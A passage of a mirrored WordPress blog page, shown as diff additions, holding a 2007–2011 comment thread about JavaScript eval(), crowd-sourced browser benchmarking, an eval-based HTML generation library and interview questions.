+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-173">
+							<time datetime="2007-04-04T02:09:34+00:00">
+								4th April 2007 at 2:09 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hmmm, a wiki would be a really good way to accumulate the info&#8230; benchmarks, tips and techniques, code samples, etc&#8230;.</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-174" class="comment even thread-odd thread-alt depth-1">
+			<article id="div-comment-174" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://berniecode.com/' rel='external nofollow' class='url'>bernie</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-174">
+							<time datetime="2007-04-04T08:57:51+00:00">
+								4th April 2007 at 8:57 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>It would need to be a custom wiki, because there&#8217;s structure. It would be a shame to rely on people e.g. putting a box in the top left corner of each page with the tip summary (as in the first link in my last post). I think TWiki would let you create forms so each page looks similar.</p>
+<p>Perhaps people could submit code fragments in a certain way, and the fragment would get tested using some standard timing widget.</p>
+<p>Interesting. If only I didn&#8217;t need sleep!</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-175" class="comment odd alt thread-even depth-1">
+			<article id="div-comment-175" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-175">
+							<time datetime="2007-04-05T03:39:57+00:00">
+								5th April 2007 at 3:39 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>I&#8217;m sure I ran across a timing widget at one point&#8230; firebug has a profiler that might be useful, but not necessarily in some automated fashion.  How hard could it be to write one?</p>
+<p>Ahhhh yes&#8230; sleep&#8230; I sort of remember what that&#8217;s like&#8230;</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-176" class="comment even thread-odd thread-alt depth-1">
+			<article id="div-comment-176" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-176">
+							<time datetime="2007-04-07T15:46:24+00:00">
+								7th April 2007 at 3:46 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Here&#8217;s one attempt at benchmarking various Javascript primitives&#8230; <a href="http://www.jorendorff.com/articles/javascript/speed-test.html" rel="nofollow">http://www.jorendorff.com/articles/javascript/speed-test.html</a></p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-177" class="comment odd alt thread-even depth-1">
+			<article id="div-comment-177" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://berniecode.com/' rel='external nofollow' class='url'>bernie</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-177">
+							<time datetime="2007-04-09T11:07:36+00:00">
+								9th April 2007 at 11:07 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>That&#8217;s perfect because the tests are posted as HTML, and run automatically.</p>
+<p>Now imagine anyone coming to that page, running the tests, and the results being posted back to the server for collating.</p>
+<p>You&#8217;d run it on a domain with no cookies or login, so there&#8217;s nothing for the scripts to steal if someone posts malicious code.</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-178" class="comment even thread-odd thread-alt depth-1">
+			<article id="div-comment-178" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-178">
+							<time datetime="2007-04-12T12:43:07+00:00">
+								12th April 2007 at 12:43 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>It would be challenging to account for the variables, like cpu speed, memory size, etc.  Easier to account for the browser being used&#8230; But if you got enough people to do it, in the end statistics would win out and you could derive a statistically valid cost of specific operations&#8230; in the end you wouldn&#8217;t be able to say &#8220;this is the cost to YOU for this operation,&#8221; but you -would- be able to say &#8220;this is the relative cost of these two operations, and if you use the faster of the two, on average your site will perform better for all visitors.&#8221;  THAT would be cool, and in fact much more valuable&#8230;</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-179" class="comment odd alt thread-even depth-1">
+			<article id="div-comment-179" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://berniecode.com/' rel='external nofollow' class='url'>bernie</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-179">
+							<time datetime="2007-04-12T13:16:03+00:00">
+								12th April 2007 at 1:16 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Indeed. If the data set is large enough, one could present standard deviations, or some more user friendly measure of variance, to indicate if an operation is generally fast but seems to really kill some browsers / configurations.</p>
+<p>I had another look at TWiki, it looks suitable for creating a site where people can submit code into a standard test suite, but not suitable for collecting the results from visitors. We&#8217;d probably need a custom web app for that.</p>
+<p>I <i>am</i> looking for an excuse to learn Ruby on Rails, but there&#8217;s so little time&#8230;</p>
+<p>The next big block of time I have free is my Honeymoon in 3 months, and I&#8217;d be dead for even suggesting that I bring the laptop ;o)</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-180" class="comment even thread-odd thread-alt depth-1">
+			<article id="div-comment-180" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-180">
+							<time datetime="2007-04-14T15:20:08+00:00">
+								14th April 2007 at 3:20 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Awww go ahead and sneak the laptop into the luggage&#8230; you gotta have somewhere to download the digital pics, you know&#8230; ;)</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-181" class="comment odd alt thread-even depth-1">
+			<article id="div-comment-181" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/450ab7d1411b821aa227d4f7a40f9ac4?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/450ab7d1411b821aa227d4f7a40f9ac4?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.freewebs.com/ca_redwards/html.html' rel='external nofollow' class='url'>Rick Renfrow</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-181">
+							<time datetime="2007-07-21T08:05:26+00:00">
+								21st July 2007 at 8:05 am							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>I&#8217;ve written a very compact client-side HTML generation library (under 4k)&#8230; and it very heavily relies upon a single eval() statement to define hundreds of functions named after the HTML tag/attributes that they implement.  It is very fast, and in benchmark tests, it beats both DOM and innerHTML methods of creating large constructs.  In the website referenced, I&#8217;ve provided an online HTML() Construction Kit tool that allows you see how clientlets get rendered.</p>
+<p>In the example, the 115 byte expression&#8230;</p>
+<p>[[o=&#8217;O&#8217;,x=&#8217;X&#8217;,o].TD(),[x,x,x].TD(STYLE(background_color(&#8216;red&#8217;))),[x,o,o].TD()].TR().TABLE(BORDER(1)+CELLPADDING(5))</p>
+<p>&#8230;renders 255 bytes of flawless HTML&#8230;</p>
+<p>&lt;table border=&quot;1&quot; cellpadding=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;O&lt;/td&gt;&lt;td&gt;X&lt;/td&gt;&lt;td&gt;O&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot; background-color: red;&quot;&gt;X&lt;/td&gt;&lt;td style=&quot; background-color: red;&quot;&gt;X&lt;/td&gt;&lt;td style=&quot; background-color: red;&quot;&gt;X&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;X&lt;/td&gt;&lt;td&gt;O&lt;/td&gt;&lt;td&gt;O&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</p>
+<p>In fact, this library is the basis of a pop-up calendar (a date selector) implemented in well under 5k.</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-182" class="comment even thread-odd thread-alt depth-1 parent">
+			<article id="div-comment-182" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/85dbc66b68ac9b648ecf65e171e695f7?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/85dbc66b68ac9b648ecf65e171e695f7?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn">Dave</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-182">
+							<time datetime="2011-06-16T13:39:48+00:00">
+								16th June 2011 at 1:39 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>&#8220;what is eval(), and why shouldn&#8217;t you use it&#8221; is a terrible question for an interview &#8211; it is counter-indicative, ie, a candidate who has used it extensively is more likely to know the answer than an candidate who read once that it is evil, found alternative methods, and forgot all about eval().  The second candidate is the better choice, but is unlikely to know the answer because they have never encountered the problem.</p>
+<p>So, what is an example of a counter-indicative question, and why shouldn&#8217;t you use it?</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+<ol class="children">
+		<li id="comment-183" class="comment byuser comment-author-bernie bypostauthor odd alt depth-2 parent">
+			<article id="div-comment-183" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://berniesumption.com/' rel='external nofollow' class='url'>bernie</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-183">
+							<time datetime="2011-06-16T16:01:58+00:00">
+								16th June 2011 at 4:01 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Sure, I don&#8217;t literally ask &#8220;what is eval(), and why shouldn&#8217;t you use it&#8221;, the question is more likely to be &#8220;what does eval do&#8221;, followed by &#8220;what is it useful for&#8221;. Warning bells ring if I get an example that can be easily done without eval().</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+<ol class="children">
+		<li id="comment-184" class="comment even depth-3">
+			<article id="div-comment-184" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/85dbc66b68ac9b648ecf65e171e695f7?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/85dbc66b68ac9b648ecf65e171e695f7?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn">Dave</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-184">
+							<time datetime="2011-06-16T18:26:39+00:00">
+								16th June 2011 at 6:26 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>I only jumped on it because it was covered in a class I took once upon a time, and because in interviews I have been asked things like &#8220;what is the best way to debug&#8230;.&#8221;  I didn&#8217;t know &#8211; never made that mistake!</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		</ol><!-- .comment-list -->
+
+		
+	
+			<p class="no-comments">Comments are closed.</p>
+	
+	
+</div><!-- .comments-area -->
+
+	<nav class="navigation post-navigation" role="navigation">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="../animator/index.html" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span> <span class="screen-reader-text">Previous post:</span> <span class="post-title">Animator.js: JavaScript animation library</span></a></div><div class="nav-next"><a href="../inamo-mouse-system-multiple-mouse-pointers-in-flash/index.html" rel="next"><span class="meta-nav" aria-hidden="true">Next</span> <span class="screen-reader-text">Next post:</span> <span class="post-title">The inamo mouse system: a hacktastic story</span></a></div></div>
+	</nav>
+		</main><!-- .site-main -->
+	</div><!-- .content-area -->
+
+
+	</div><!-- .site-content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="site-info">
+						<a href="https://wordpress.org/">Proudly powered by WordPress</a>
+		</div><!-- .site-info -->
+	</footer><!-- .site-footer -->
+
+</div><!-- .site -->
+
+<script type='text/javascript'>
+var colomatduration = 'fast';
+var colomatslideEffect = 'slideFade';
+</script><script type='text/javascript' src='../../wp-content/plugins/jquery-collapse-o-matic/js/collapse7514.js?ver=1.6.6'></script>
+<script type='text/javascript' src='../../wp-content/plugins/wp-syntax/js/wp-syntax4963.js?ver=1.1'></script>
+<script type='text/javascript' src='../../wp-content/themes/twentyfifteen/js/skip-link-focus-fixd01e.js?ver=20141010'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var screenReaderText = {"expand":"<span class=\"screen-reader-text\">expand child menu<\/span>","collapse":"<span class=\"screen-reader-text\">collapse child menu<\/span>"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../wp-content/themes/twentyfifteen/js/functions8337.js?ver=20150330'></script>
+
+</body>
+
+<!-- Mirrored from blog.berniesumption.com/software/eval-considered-useful/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Oct 2019 12:37:06 GMT -->
+</html>
+
+<!-- Dynamic page generated in 1.233 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2019-10-17 12:33:17 -->
+
+<!-- super cache -->
